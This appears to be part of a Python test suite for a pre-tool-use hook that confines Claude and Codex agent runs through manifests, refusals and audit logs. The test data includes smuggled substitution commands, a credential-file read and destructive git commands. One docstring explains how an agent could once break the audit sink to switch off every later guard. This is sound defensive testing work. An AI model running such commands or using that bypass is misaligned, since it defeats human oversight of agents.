        # Arithmetic inside quotes must not mask a real redirect outside quotes
        cmd = 'python3 foo.py --val "$((1 > 0))" > workspace/out.txt'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/out.txt", targets)
        self.assertNotIn("0", targets)

    def test_detect_bash_write_targets_nested_subst_in_arithmetic(self) -> None:
        # $(( $(echo 1 > /tmp/pwn; echo 1) + 1 )) — nested $() inside $(()) executes
        cmd = '--arg "$(( $(echo 1 > /tmp/pwn; echo 1) + 1 ))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/pwn", targets)

    def test_detect_bash_write_targets_backtick_in_arithmetic(self) -> None:
        # $(( `echo 1 > /tmp/bt; echo 1` + 1 )) — backtick inside $(()) executes
        cmd = "$(( `echo 1 > /tmp/bt; echo 1` + 1 ))"
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/bt", targets)

    def test_detect_bash_write_targets_arithmetic_comparison_still_ignored(self) -> None:
        # Plain arithmetic inside quotes — $((a > b)) is comparison, not redirect
        cmd = 'python3 foo.py --val "$((a > b))"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_bash_write_guard_blocks_for_codex_and_claude_when_agent_run_id_unresolved(self) -> None:
        for backend in ("codex", "claude"):
            with self.subTest(backend=backend):
                with tempfile.TemporaryDirectory() as tmp:
                    repo_root = Path(tmp)
                    orch = f"orch_bash_guard_unresolved_{backend}"
                    orch_root = repo_root / "workspace" / "orchestrations" / orch
                    orch_root.mkdir(parents=True, exist_ok=True)
                    payload = {
                        "orchestration_id": orch,
                        "repo_root": str(repo_root),
                        "tool_name": "Bash",
                        "session_id": "sess_missing_001",
                        "tool_input": {"command": "echo hello > workspace/pipelines/safe/out.txt"},
                    }
                    out = io.StringIO()
                    env = {"METFORGE_WORKFLOW_MODE": "1"}
                    if backend == "codex":
                        env["METFORGE_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
                    with patch.dict(os.environ, env, clear=False):
                        with redirect_stdout(out):
                            code = cli.main(
                                [
                                    "--backend",
                                    backend,
                                    "--event",
                                    "PreToolUse",
                                    "--input-json",
                                    json.dumps(payload),
                                ]
                            )
                    self.assertEqual(code, 2)
                    body = json.loads(out.getvalue().strip())
                    self.assertEqual(body.get("decision"), "block")
                    if backend == "codex":
                        self.assertIn("session-to-run mapping not found", body.get("reason", ""))
                    else:
                        reason = body.get("reason", "")
                        self.assertTrue(
                            (
                                "active child agent_run_id is empty" in reason
                                or "no orchestration_agent_run_id found" in reason
                            ),
                            msg=reason,
                        )

    def test_claude_backend_does_not_require_codex_hooks_feature(self) -> None:
        """Claude backend must not invoke the Codex feature probe at all."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "orchestration_id": "orch_claude_noprobe_001",
                "repo_root": str(repo_root_path),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hi"},
            }
            with patch("tools.hooks.cli.read_codex_feature_cache") as probe_mock:
                probe_mock.side_effect = AssertionError("codex feature cache must not be read for claude")
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_claude_backend_settings_json_command_works(self) -> None:
        # The LEAF's settings file is the owner of the hook wiring (issue #63); the
        # dev layer no longer mirrors it: issue #102 separated the two, and
        # `HookLayerSeparationTests` pins that they share no command. Reading the
        # OWNER here is what keeps this test about the wiring a leaf actually loads.
        from tools.orchestration_runtime import CLAUDE_LEAF_CONFIG_REL
        repo_root = Path(__file__).resolve().parents[2]
        settings_doc = json.loads(
            (repo_root / CLAUDE_LEAF_CONFIG_REL).read_text(encoding="utf-8")
        )
        with tempfile.TemporaryDirectory() as tmp:
            command = (
                settings_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
                .replace(
                    'METFORGE_HOOK_REPO_ROOT="$ROOT"',
                    f'METFORGE_HOOK_REPO_ROOT="{tmp}"',
                )
                .replace('--repo-root "$ROOT"', f'--repo-root "{tmp}"')
            )
            payload = {
                "orchestration_id": "orch_claude_settings_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            proc = subprocess.run(
                command,
                cwd=str(repo_root / "tools"),
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                shell=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            # Strip shell-profile noise (e.g. nvm banner from `sh -lc`) before asserting.
            hook_lines = [l for l in proc.stdout.splitlines() if l.strip() not in {"nvm", ""}]
            self.assertEqual(hook_lines, [])

    def test_resolve_repo_root_uses_metdsl_hook_repo_root_env(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with patch.dict(os.environ, {"METFORGE_HOOK_REPO_ROOT": tmp}):
                for backend in ("claude", "codex"):
                    result = cli._resolve_repo_root({}, backend=backend)
                    self.assertEqual(result, Path(tmp).resolve())

    @staticmethod
    def _run_claude_pre(payload: dict, env: dict[str, str]) -> tuple[int, str]:
        """Run one PreToolUse hook with `env` and NEITHER per-launch id inherited.

        The ids are popped rather than left ambient: `_extract_orchestration_id` reads
        `METFORGE_ORCHESTRATION_ID`, so an operator who exported it would otherwise turn
        every missing-id case in this class into a with-id case (issue #84).

        `tools/tests/conftest.py` now strips those names for the whole session, so under
        pytest this is the second wall rather than the only one. It is kept because it is
        not the same wall: this runs under plain `unittest` too, where no conftest is
        loaded, and it names the exact ids this class is about rather than a prefix.
        """
        with patch.dict(os.environ, env):
            for name in ("METFORGE_ORCHESTRATION_ID", "METFORGE_CHILD_AGENT_RUN_ID",
                         "METFORGE_WORKFLOW_MODE", "METFORGE_MISSING_ORCHESTRATION_ID_POLICY"):
                if name not in env:
                    os.environ.pop(name, None)
            out = io.StringIO()
            err = io.StringIO()
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            return code, out.getvalue() + err.getvalue()

    @staticmethod
    def _bash_payload(repo_root: Path, command: str) -> dict:
        return {
            "repo_root": str(repo_root),
            "tool_name": "Bash",
            "tool_input": {"command": command},
        }

    @staticmethod
    def _run_event(backend: str, event: str, payload: dict, env: dict | None = None):
        """One hook launch with NEITHER per-launch id inherited.

        The ids are popped rather than left ambient: `_extract_orchestration_id` reads
        `METFORGE_ORCHESTRATION_ID`, so an operator who exported it would otherwise turn
        every missing-id case in this class into a with-id case (issue #84).

        `tools/tests/conftest.py` now strips those names for the whole session, so under
        pytest this is the second wall rather than the only one. It is kept because it is
        not the same wall: this runs under plain `unittest` too, where no conftest is
        loaded, and it names the exact ids this class is about rather than a prefix.
        """
        with patch.dict(os.environ, env or {}):
            for name in ("METFORGE_ORCHESTRATION_ID", "METFORGE_CHILD_AGENT_RUN_ID",
                         "METFORGE_WORKFLOW_MODE", "METFORGE_MISSING_ORCHESTRATION_ID_POLICY"):
                if name not in (env or {}):
                    os.environ.pop(name, None)
            out, err = io.StringIO(), io.StringIO()
            with redirect_stdout(out), redirect_stderr(err):
                code = cli.main(["--backend", backend, "--event", event,
                                 "--input-json", json.dumps(payload)])
            return code, out.getvalue() + err.getvalue()

    def _run_pre(self, backend: str, payload: dict, env: dict | None = None):
        return self._run_event(backend, "PreToolUse", payload, env)

    def _missing_id_payload(self, repo_root: Path, **extra) -> dict:
        payload = {"repo_root": str(repo_root), "tool_name": "Bash",
                   "tool_input": {"command": "echo hello"}}
        payload.update(extra)
        return payload

    def test_a_hook_that_cannot_name_its_orchestration_is_refused(self) -> None:
        """`docs/ORCHESTRATION.md` §39, and the whole of it since issue #102.

        This entrypoint is a LEAF's. Every guard past this point is keyed on the
        orchestration_id and resolves nothing without one, so evaluating would allow.
        The operator's session that used to make a refusal here impossible now runs
        `tools/hooks/dev_cli.py`.

        Was the opposite for 4 months: `ec52a09` (2026-04-25) returned an unconditional
        ALLOW here, and issue #82 restored a refusal only under a policy variable, which
        issue #102 then deleted along with its writer.
        """
        for backend in ("claude", "codex"):
            with self.subTest(backend=backend), tempfile.TemporaryDirectory() as tmp:
                code, text = self._run_pre(backend, self._missing_id_payload(Path(tmp)))
                self.assertEqual(code, 2, msg=text)
                self.assertIn("orchestration_id is required", text)

    def test_the_refusal_names_where_an_operator_should_be_instead(self) -> None:
        """A refusal a human can act on. The reader here is an operator who wired a
        session at this entrypoint by mistake; "required" alone leaves them nowhere."""
        with tempfile.TemporaryDirectory() as tmp:
            _code, text = self._run_pre("claude", self._missing_id_payload(Path(tmp)))
            self.assertIn("dev_cli", text)
            self.assertIn(".claude/settings.json", text)

    def test_every_event_is_refused_not_only_the_command_ones(self) -> None:
        """The fallback used to be widest here: `SessionStart` / `UserPromptSubmit` /
        `Stop` took `_global` before any policy ran, so a leaf whose id was lost was
        waved through on exactly the events that open a session."""
        for event in ("SessionStart", "UserPromptSubmit", "Stop", "PostToolUse"):
            with self.subTest(event=event), tempfile.TemporaryDirectory() as tmp:
                code, text = self._run_event("codex", event, {"repo_root": tmp})
                self.assertEqual(code, 2)
                # THE REASON, not just the code. This fixture has a second path to rc 2 —
                # the codex feature cache is absent too, and refuses with its own message
                # — so asserting the code alone would hold with the refusal removed.
                self.assertIn("orchestration_id is required", text)

    def test_an_id_from_the_environment_is_enough(self) -> None:
        """The control that keeps the refusal from being read as "the payload must carry
        it". A leaf's id arrives through the environment its profile declares, and that
        is the production path."""
        with tempfile.TemporaryDirectory() as tmp:
            code, text = self._run_pre(
                "claude", self._missing_id_payload(Path(tmp)),
                env={"METFORGE_ORCHESTRATION_ID": "orch_env"})
            self.assertEqual(code, 0, msg=text)

    def test_the_refusal_is_recorded_under_global_on_every_backend_and_mode(self) -> None:
        """`docs/ORCHESTRATION.md` §38 - the refusal is the one thing worth a record here,
        since the leaf that hit it cannot name the directory its own record belongs in.

        A TABLE over the workflow mode, not the claude/workflow-mode case alone. Two
        `_global` suppressions in `_append_hook_audit` were keyed on the mode, and a leaf
        that lost `METFORGE_ORCHESTRATION_ID` has usually lost `METFORGE_WORKFLOW_MODE` from
        the same environment — so the one anomaly worth a trace was exactly the one that
        left none, and for a codex leaf (`tool_name` `shell`) it was suppressed in every
        mode. Both suppressions are gone with issue #102; this is what replaces them.
        """
        for backend, tool, mode in (("claude", "Bash", "1"), ("claude", "Bash", None),
                                    ("codex", "shell", "1"), ("codex", "shell", None)):
            with self.subTest(backend=backend, workflow_mode=mode):
                with tempfile.TemporaryDirectory() as tmp:
                    payload = self._missing_id_payload(Path(tmp))
                    payload["tool_name"] = tool
                    code, _text = self._run_pre(
                        backend, payload,
                        env={"METFORGE_WORKFLOW_MODE": mode} if mode else {})
                    self.assertEqual(code, 2)
                    log = (Path(tmp) / "workspace" / "orchestrations" / "_global" / "hooks"
                           / "native_hook_events.jsonl")
                    self.assertTrue(log.exists(), "the refusal left no trace")
                    entry = json.loads(log.read_text(encoding="utf-8").splitlines()[-1])
                    self.assertEqual(entry["action"], "block")
                    self.assertIn("orchestration_id is required", entry["reason"])

    def test_no_record_is_written_when_no_repo_root_can_be_resolved(self) -> None:
        """The half of the pollution guard that is NOT `_global`-specific and stays: with
        no `repo_root` in the payload and none in the environment, there is no tree to
        write into and the refusal is still returned."""
        with patch.dict(os.environ, {}):
            for name in ("METFORGE_ORCHESTRATION_ID", "METFORGE_HOOK_REPO_ROOT",
                         "METFORGE_WORKFLOW_MODE"):
                os.environ.pop(name, None)
            with tempfile.TemporaryDirectory() as tmp:
                cwd = os.getcwd()
                os.chdir(tmp)
                try:
                    out, err = io.StringIO(), io.StringIO()
                    with redirect_stdout(out), redirect_stderr(err):
                        code = cli.main(["--backend", "claude", "--event", "PreToolUse",
                                         "--input-json", json.dumps(
                                             {"tool_name": "Bash",
                                              "tool_input": {"command": "echo hello"}})])
                finally:
                    os.chdir(cwd)
                self.assertEqual(code, 2)
                self.assertFalse((Path(tmp) / "workspace").exists())

    @unittest.skipIf(os.geteuid() == 0, "root bypasses file permissions")
    def test_a_decision_survives_an_unwritable_audit_sink(self) -> None:
        """An audit write must never decide the verdict — the fail-open this closes.

        `_append_hook_audit` wrote with no exception handling, and `main()` calls it from
        inside its `try` AND from the `except` handler, so an `OSError` on the sink became
        a double fault that escaped with rc 1 and an EMPTY stdout. rc 2 is the block
        signal and a codex `PermissionRequest` carries its deny in the body, so the
        refusal was delivered by neither.

        It is REACHABLE by a leaf, and that is why this is a table rather than a note:
        `workspace/orchestrations/<id>/hooks/` is bound WRITABLE to a leaf
        (`runtime_rw_rel_paths`), and this same hook allows `rm -f` / `mkdir` /
        `chmod 000` on the sink and `python3 workspace/tmp/…` (all measured rc 0). One
        allowed command therefore switched off every later policy — the write manifest,
        the read manifest, the credential refusal, the protected-root resolver — and left
        no row saying so. Pre-existing; the branch's own `_global` refusal made it certain
        under bwrap, where `_global/` is not a leaf write root at all.
        """
        blocked = "cat ~/.claude.json"

        def sink_of(root: Path, orch: str) -> Path:
            return (root / "workspace" / "orchestrations" / orch / "hooks"
                    / "native_hook_events.jsonl")

        # (1) the id-bearing path: the sink destroyed the way a leaf can destroy it.
        for label in ("directory", "unwritable file"):
            with self.subTest(sink=label), tempfile.TemporaryDirectory() as tmp:
                root, orch = Path(tmp), "orch_sink"
                sink = sink_of(root, orch)
                sink.parent.mkdir(parents=True)
                if label == "directory":
                    sink.mkdir()
                else:
                    sink.write_text("", encoding="utf-8")
                    os.chmod(sink, 0)
                payload = {"repo_root": tmp, "orchestration_id": orch,
                           "tool_name": "Bash", "tool_input": {"command": blocked}}
                code, text = self._run_pre(
                    "claude", payload,
                    env={"METFORGE_WORKFLOW_MODE": "1", "METFORGE_ORCHESTRATION_ID": orch})
                self.assertEqual(code, 2, msg=text)
                self.assertIn("forbidden in workflow mode", text)

        # (2) the missing-id refusal with no writable tree at all, which is what a leaf
        # that lost its id meets under bwrap. Both backends, because the codex
        # `PermissionRequest` deny is carried in the BODY at rc 0 and would vanish
        # differently from the rc 2 one.
        for backend, event, want_rc in (("claude", "PreToolUse", 2),
                                        ("codex", "PreToolUse", 2),
                                        ("codex", "PermissionRequest", 0)):
            with self.subTest(backend=backend, event=event), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                (root / "workspace" / "orchestrations").mkdir(parents=True)
                os.chmod(root / "workspace" / "orchestrations", 0o500)
                try:
                    code, text = self._run_event(
                        backend, event, self._missing_id_payload(root),
                        env={"METFORGE_WORKFLOW_MODE": "1"})
                finally:
                    os.chmod(root / "workspace" / "orchestrations", 0o700)
                self.assertEqual(code, want_rc, msg=text)
                self.assertIn("orchestration_id is required", text)
                self.assertNotIn("Traceback", text)

    def test_the_payload_is_preferred_over_the_environment_for_the_id(self) -> None:
        """The precedence in `_extract_orchestration_id`, which issue #102 made
        load-bearing: it no longer decides only WHICH id labels an audit row, it decides
        refuse versus evaluate. A mutation inverting it survived the whole suite.

        Neither field it reads is leaf-settable today — the CLI authors the hook payload
        and `tool_input` is the only leaf-controlled part, which this function does not
        read — so this is a witness, not a fix. What it buys is that a later change
        letting any leaf-reachable field reach `payload["orchestration_id"]` cannot land
        silently.
        """
        from tools.hooks import cli as _cli
        with patch.dict(os.environ, {"METFORGE_ORCHESTRATION_ID": "orch_from_env"}):
            self.assertEqual(
                _cli._extract_orchestration_id({"orchestration_id": "orch_from_payload"}),
                "orch_from_payload")
            self.assertEqual(
                _cli._extract_orchestration_id(
                    {"payload": {"orchestration_id": "orch_from_inner"}}),
                "orch_from_inner")
            self.assertEqual(_cli._extract_orchestration_id({}), "orch_from_env")
        with patch.dict(os.environ, {}):
            os.environ.pop("METFORGE_ORCHESTRATION_ID", None)
            self.assertIsNone(_cli._extract_orchestration_id({}))

    def test_the_operator_safety_audit_detail_survives_the_extraction(self) -> None:
        """The half of "behaviour-preserving" that had no witness.

        The extraction into `tools/hooks/operator_safety.py` preserves the `audit_detail`
        dicts of both policies, and a mutation setting `audit_detail=None` at the wrapping
        site survived the suite: nothing read them. They are what
        `native_hook_events.jsonl` records the policy id by, so an operator reading the
        audit for "which rule fired" depends on them.
        """
        from tools.hooks.common import HookInput, HookEventName, evaluate_common_policy
        cases = (
            ('git reset --hard HEAD~1', "forbid_git_reset_hard", None),
            ("python3 tools/x.py --force-pass", "forbid_verify_bypass_flags_in_dev_mode",
             ["--force-pass"]),
        )
        for command, policy, matched in cases:
            with self.subTest(policy=policy):
                decision = evaluate_common_policy(HookInput(
                    event_name=HookEventName.PRE_COMMAND_EXECUTE,
                    backend="claude",
                    payload={"tool_input": {"command": command}},
                    command=command))
                self.assertIsNotNone(decision.audit_detail)
                self.assertEqual(decision.audit_detail.get("policy"), policy)
                self.assertEqual(decision.audit_detail.get("command"), command)
                if matched is not None:
                    self.assertEqual(decision.audit_detail.get("matched_tokens"), matched)

    def test_a_non_oserror_from_the_audit_still_fails_closed(self) -> None:
        """The THIRD guard, which the commit that added it left unwitnessed.

        The two guards inside `_append_hook_audit` catch `OSError`. The write can raise
        outside that class — a lone surrogate in the command makes
        `json.dumps(ensure_ascii=False)` produce a string the UTF-8 encoder refuses, a
        `ValueError` — and the only thing that then keeps the refusal deliverable is the
        `except Exception` around the HANDLER's own audit call. Removing it survived the
        whole suite: measured, rc 1 with empty stdout, which is neither the rc 2 block nor
        a codex deny body.

        Honest limit: this proves the ENTRYPOINT accepts such a payload. Whether the CLI
        ever emits a lone surrogate into a hook payload is not measured, and the finding
        does not rest on it — `except OSError` is a narrower net than the failure set of
        `mkdir` / `open` / `write`, so the guard is load-bearing either way.
        """
        with tempfile.TemporaryDirectory() as tmp:
            orch = "orch_surrogate"
            (Path(tmp) / "workspace" / "orchestrations" / orch / "hooks").mkdir(parents=True)
            payload = {"repo_root": tmp, "orchestration_id": orch, "tool_name": "Bash",
                       "tool_input": {"command": "echo hi \ud800"}}
            code, text = self._run_pre(
                "claude", payload,
                env={"METFORGE_WORKFLOW_MODE": "1", "METFORGE_ORCHESTRATION_ID": orch,
                     "METFORGE_HOOK_REPO_ROOT": tmp})
            self.assertEqual(code, 2, msg=text)
            self.assertIn("hook entrypoint failure", text)
            self.assertNotIn("Traceback", text)

    def test_the_record_follows_the_policy_for_the_nested_payload_too(self) -> None:
        """The rest of the unification. `_append_hook_audit` read the nested (codex)
        `repo_root` while `_resolve_repo_root` never looked there and fell back to the
        cwd, so a codex payload carrying only the nested key had its decision evaluated
        against one tree and recorded under another — the same false-record class as the
        top-level pair, one key over. Both read one resolver now."""
        from tools.hooks import cli as _cli
        with tempfile.TemporaryDirectory() as nested:
            payload = {"payload": {"repo_root": nested}}
            with patch.dict(os.environ, {}):
                os.environ.pop("METFORGE_HOOK_REPO_ROOT", None)
                self.assertEqual(_cli._resolve_repo_root(payload),
                                 Path(nested).resolve())
                self.assertEqual(_cli._repo_root_from_sources(payload),
                                 Path(nested).resolve())
                # …and the env still outranks both, for both callers.
                with tempfile.TemporaryDirectory() as env_root:
                    os.environ["METFORGE_HOOK_REPO_ROOT"] = env_root
                    self.assertEqual(_cli._resolve_repo_root(payload),
                                     Path(env_root).resolve())
                    self.assertEqual(_cli._repo_root_from_sources(payload),
                                     Path(env_root).resolve())
                os.environ.pop("METFORGE_HOOK_REPO_ROOT", None)
                self.assertIsNone(_cli._repo_root_from_sources({}))

    def test_the_record_lands_where_the_policy_was_evaluated(self) -> None:
        """The audit and the policy must resolve `repo_root` the same way.

        They did not: `_append_hook_audit` preferred the payload's copy and
        `_resolve_repo_root` — what `main()` evaluates under — prefers the environment's.
        Measured with the two disagreeing, the decision was made for one tree and recorded
        under the other, which is a false record rather than a missing one. Both committed
        wrappers set both to `$ROOT`, so production never disagreed and nothing made them
        agree.
        """
        with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
            orch = "orch_two_roots"
            payload = {"repo_root": b, "orchestration_id": orch, "tool_name": "Bash",
                       "tool_input": {"command": "cat ~/.claude.json"}}
            code, _text = self._run_pre(
                "claude", payload,
                env={"METFORGE_WORKFLOW_MODE": "1", "METFORGE_ORCHESTRATION_ID": orch,
                     "METFORGE_HOOK_REPO_ROOT": a})
            self.assertEqual(code, 2)
            in_a = (Path(a) / "workspace" / "orchestrations" / orch / "hooks"
                    / "native_hook_events.jsonl")
            in_b = (Path(b) / "workspace" / "orchestrations" / orch / "hooks"
                    / "native_hook_events.jsonl")
            self.assertTrue(in_a.exists(), "the record did not land where the policy ran")
            self.assertFalse(in_b.exists(), "the record landed in the other tree")

    def test_nothing_writes_the_deleted_policy_variable(self) -> None:
        """The writer, not only the reader (issue #102).

        `tools/run_workflow.py` seeded `METFORGE_MISSING_ORCHESTRATION_ID_POLICY` into
        every node's environment for four months while nothing read it — the false
        evidence issue #82 was filed for. Deleting the reader without pinning the writer
        leaves the same shape available to the next edit, and a round-0 mutation sweep
        confirmed re-adding the line is noticed by nothing.

        Pins WRITES, not occurrences: `tools/orchestration_runtime.py` names the
        variable in a comment that records why the prefix rule must not rest on an
        inventory of readers, and that mention is supposed to stay.
        """
        import re as _re
        repo_root = Path(__file__).resolve().parents[2]
        writer = _re.compile(
            r"""(?:environ|env|base_env|child_env|body)\s*\[\s*["']METFORGE_MISSING_ORCHESTRATION_ID_POLICY["']\s*\]\s*=|"""
            r"""(?:setenv|putenv)\s*\(\s*["']METFORGE_MISSING_ORCHESTRATION_ID_POLICY["']""")
        # Self-test the detector: a negative assertion over a scan is green when the
        # scan is broken, and this one is a scan.
        self.assertTrue(writer.search('base_env["METFORGE_MISSING_ORCHESTRATION_ID_POLICY"] = "strict"'))
        self.assertTrue(writer.search("env['METFORGE_MISSING_ORCHESTRATION_ID_POLICY']  =  x"))
        self.assertFalse(writer.search("# METFORGE_MISSING_ORCHESTRATION_ID_POLICY is deleted"))
        scanned = 0
        offenders = []
        for path in sorted((repo_root / "tools").rglob("*.py")):
            if "tests" in path.parts or "__pycache__" in path.parts:
                continue
            scanned += 1
            for lineno, line in enumerate(
                    path.read_text(encoding="utf-8", errors="replace").splitlines(), 1):
                if writer.search(line):
                    offenders.append(f"{path.relative_to(repo_root)}:{lineno}")
        self.assertGreater(scanned, 10, "the scan collapsed; it is asserting over nothing")
        self.assertEqual(offenders, [])

    def test_no_environment_value_turns_the_refusal_off(self) -> None:
        """It is not a policy any more. `METFORGE_MISSING_ORCHESTRATION_ID_POLICY` was
        deleted with its writer (issue #102); this samples the spellings that used to
        mean something, so a re-introduced knob cannot pass unnoticed."""
        for value in ("", "global", "permissive", "0", "strict"):
            with self.subTest(value=value), tempfile.TemporaryDirectory() as tmp:
                code, _text = self._run_pre(
                    "claude", self._missing_id_payload(Path(tmp)),
                    env={"METFORGE_MISSING_ORCHESTRATION_ID_POLICY": value})
                self.assertEqual(code, 2)

    def test_workflow_mode_accepts_orchestration_id_from_environment(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root_path = Path(tmp)
            payload = {
                "repo_root": str(repo_root_path),
                "tool_name": "WebSearch",
                "tool_input": {"query": "workflow status"},
            }
            with patch.dict(
                os.environ,
                {
                    "METFORGE_WORKFLOW_MODE": "1",
                    "METFORGE_ORCHESTRATION_ID": "orch_env_001",
                    "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0",
                },
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)
            log_path = (
                repo_root_path
                / "workspace"
                / "orchestrations"
                / "orch_env_001"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertTrue(log_path.is_file())

    def test_claude_file_tool_blocks_write_outside_manifest_when_active_child_exists(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_001"
            run_id = "step_run_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps({
                    "allowed_output_paths": ["workspace/pipelines/safe/out.txt"],
                    "allowed_file_tool_paths": ["workspace/pipelines/safe/out.txt"],
                }),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "tool_input": {"file_path": "workspace/forbidden.txt"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("unauthorized write", body.get("reason", ""))
            self.assertIn("Edit/Write", body.get("reason", ""))

    def test_claude_read_allows_self_output_and_read_manifest_without_allowed_root(self) -> None:
        """The output/read manifest can be Read even if not in allowed_read_roots."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_manifest_read_001"
            run_id = "child_run_manifest_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "active_child_agent_run_id.txt").write_text(run_id, encoding="utf-8")
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps({
                    "allowed_output_paths": ["workspace/pipelines/safe/out.txt"],
                    "allowed_file_tool_paths": ["workspace/pipelines/safe/out.txt"],
                }),
                encoding="utf-8",
            )
            (orch_root / "read_manifests" / f"{run_id}.json").write_text(
                json.dumps({"allowed_read_roots": ["docs/"]}),
                encoding="utf-8",
            )
            out_manifest_rel = f"workspace/orchestrations/{orch}/output_manifests/{run_id}.json"
            read_manifest_rel = f"workspace/orchestrations/{orch}/read_manifests/{run_id}.json"
            for target in (out_manifest_rel, read_manifest_rel):
                payload = {
                    "orchestration_id": orch,
                    "repo_root": str(repo_root),
                    "tool_name": "Read",
                    "tool_input": {"file_path": target},
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "claude",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 0, msg=f"expected allow for {target!r}")
                raw = out.getvalue().strip()
                if raw:
                    body = json.loads(raw)
                    self.assertEqual(body.get("decision"), "allow", msg=target)

    def test_codex_file_tool_resolves_session_to_agent_run_and_allows_manifest_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_002"
            run_id = "step_run_build_001"
            session_id = "sess_step_build_001"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps({
                    "allowed_output_paths": ["workspace/pipelines/safe/out.txt"],
                    "allowed_file_tool_paths": ["workspace/pipelines/safe/out.txt"],
                }),
                encoding="utf-8",
            )
            (orch_root / "agent_runs.jsonl").write_text(
                json.dumps(
                    {
                        "agent_run_id": run_id,
                        "agent_backend": "codex",
                        "agent_session_id": session_id,
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": session_id,
                "tool_input": {"file_path": "workspace/pipelines/safe/out.txt"},
            }
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 0)

    def test_codex_file_tool_allows_with_session_run_index_before_agent_runs_recorded(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_file_guard_index_001"
            run_id = "step_run_build_index_001"
            session_id = "sess_step_build_index_001"
            target = "workspace/pipelines/safe/out.txt"
            orch_root = repo_root / "workspace" / "orchestrations" / orch
            (orch_root / "output_manifests").mkdir(parents=True, exist_ok=True)
            (orch_root / "session_run_index.json").write_text(
                json.dumps(
                    {
                        "entries": [
                            {
                                "agent_run_id": run_id,
                                "agent_session_id": session_id,
                                "session_id": session_id,
                                "context_id": "ctx_step_build_index_001",
                                "agent_role": "step",
                                "status": "running",
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            (orch_root / "output_manifests" / f"{run_id}.json").write_text(
                json.dumps(
                    {
                        "orchestration_id": orch,
                        "agent_run_id": run_id,
                        "allowed_output_paths": [target],
                        "allowed_file_tool_paths": [target],
                    }
                ),
                encoding="utf-8",
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Write",
                "session_id": session_id,
                "tool_input": {"file_path": target},
            }
            with patch.dict(
                os.environ,
                {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--event",
                        "PreToolUse",
                        "--input-json",
